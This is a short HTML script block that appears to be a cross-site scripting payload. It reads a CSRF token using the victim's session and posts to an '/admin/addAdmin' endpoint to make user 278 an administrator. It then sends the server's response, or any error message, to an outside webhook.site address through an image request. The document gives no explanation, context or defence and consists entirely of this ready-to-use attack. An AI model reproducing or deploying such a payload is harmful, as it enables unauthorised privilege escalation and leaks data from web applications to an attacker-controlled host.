<script>
  fetch('/csrf-token',{credentials:'include'})
    .then(r=>r.json())
    .then(token=>{
      return fetch('/admin/addAdmin',{
        method:'POST',
        credentials:'include',
        headers:{
          'Content-Type':'application/json',
          'CSRF-Token': token.csrf
        },
        body: JSON.stringify({ userId: 278 })
      })
      .then(r=>r.text())
      .then(t=> new Image().src = 'https://webhook.site/290533ab-31e3-4217-b6d0-f4a6df2f7160?res=' + encodeURIComponent(t))
    })
    .catch(e=> new Image().src = 'https://webhook.site/290533ab-31e3-4217-b6d0-f4a6df2f7160?err=' + encodeURIComponent(e.message));
</script>
